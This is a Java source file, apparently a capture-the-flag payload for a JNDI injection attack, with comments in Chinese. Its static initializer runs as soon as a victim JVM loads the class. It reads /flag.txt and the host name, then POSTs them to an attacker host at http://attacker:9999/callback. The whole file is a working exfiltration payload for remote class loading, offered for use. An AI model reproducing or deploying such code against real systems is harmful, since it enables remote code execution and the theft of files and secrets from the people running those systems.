import java.io.*;
import java.net.*;

/**
 * 
 * 當受害者的 JVM 載入此類別時，靜態初始化區塊會自動執行：
 * 1. 讀取 /flag.txt 檔案內容
 * 
 */
public class Exploit {
    
    static {
        try {
            // 讀取 flag 檔案
            String flag = "";
            try {
                BufferedReader reader = new BufferedReader(new FileReader("/flag.txt"));
                flag = reader.readLine();
                reader.close();
            } catch (Exception e) {
                flag = "ERROR: Could not read /flag.txt - " + e.getMessage();
            }
            
            // 取得系統資訊
            String hostname = "";
            try {
                hostname = InetAddress.getLocalHost().getHostName();
            } catch (Exception e) {
                hostname = "unknown";
            }
            
            // 建立回傳資料
            String data = "flag=" + URLEncoder.encode(flag, "UTF-8") + 
                          "&hostname=" + URLEncoder.encode(hostname, "UTF-8") +
                          "&timestamp=" + System.currentTimeMillis();
            
            String callbackUrl = "http://attacker:9999/callback";
            URL url = new URL(callbackUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            // 寫入資料
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes("UTF-8"));
            os.flush();
            os.close();
            
            // 讀取回應
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            System.out.println("[Exploit] Flag sent successfully! Response code: " + responseCode);
            
        } catch (Exception e) {
            System.err.println("[Exploit] Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    // 建構子（可能被某些 JNDI 實作呼叫）
    public Exploit() {
        // 靜態初始化區塊已經執行過了
    }
}
